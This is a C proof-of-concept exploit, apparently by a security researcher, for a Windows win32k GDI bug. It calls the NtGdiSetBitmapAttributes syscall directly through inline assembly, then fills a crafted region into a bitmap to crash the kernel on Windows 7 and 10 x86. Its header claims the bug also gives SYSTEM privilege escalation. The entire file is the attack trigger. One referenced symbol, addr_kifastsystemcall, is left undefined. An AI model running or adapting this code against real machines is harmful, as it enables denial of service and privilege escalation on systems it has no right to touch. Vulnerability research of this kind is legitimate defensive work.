/**
* Author: bee13oy of CloverSec Labs
* BSoD on Windows 7 SP1 x86 / Windows 10 x86
* EoP to SYSTEM on Windows 7 SP1 x86
**/

#include <Windows.h>

#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")

unsigned int demo_CreateBitmapIndirect(void) {
	static BITMAP bitmap = { 0, 8, 8, 2, 1, 1 };
	static BYTE bits[8][2] = { 0xFF, 0, 0x0C, 0, 0x0C, 0, 0x0C, 0,
		0xFF, 0, 0xC0, 0, 0xC0, 0, 0xC0, 0 };

	bitmap.bmBits = bits;

	SetLastError(NO_ERROR);

	HBITMAP hBitmap = CreateBitmapIndirect(&bitmap);

	return (unsigned int)hBitmap;
}

#define eSyscall_NtGdiSetBitmapAttributes 0x1110

W32KAPI HBITMAP NTAPI NtGdiSetBitmapAttributes(
	HBITMAP argv0,
	DWORD argv1
	)
{
	__asm
	{
		push argv1;
		push argv0;
		push 0x00;
		mov eax, eSyscall_NtGdiSetBitmapAttributes;
		mov edx, addr_kifastsystemcall;
		call edx;
		add esp, 0x0c;
	}
}

void Trigger_BSoDPoc() {
	HBITMAP hBitmap1 = (HBITMAP)demo_CreateBitmapIndirect();
	HBITMAP hBitmap2 = (HBITMAP)NtGdiSetBitmapAttributes((HBITMAP)hBitmap1, (DWORD)0x8f9);

	RECT rect = { 0 };
	rect.left = 0x368c;
	rect.top = 0x400000;
	HRGN hRgn = (HRGN)CreateRectRgnIndirect(&rect);

	HDC hdc = (HDC)CreateCompatibleDC((HDC)0x0);
	SelectObject((HDC)hdc, (HGDIOBJ)hBitmap2);

	HBRUSH hBrush = (HBRUSH)CreateSolidBrush((COLORREF)0x00edfc13);

	FillRgn((HDC)hdc, (HRGN)hRgn, (HBRUSH)hBrush);
}

int _tmain(int argc, _TCHAR* argv[])
{
	Trigger_BSoDPoc();
	return 0;
}
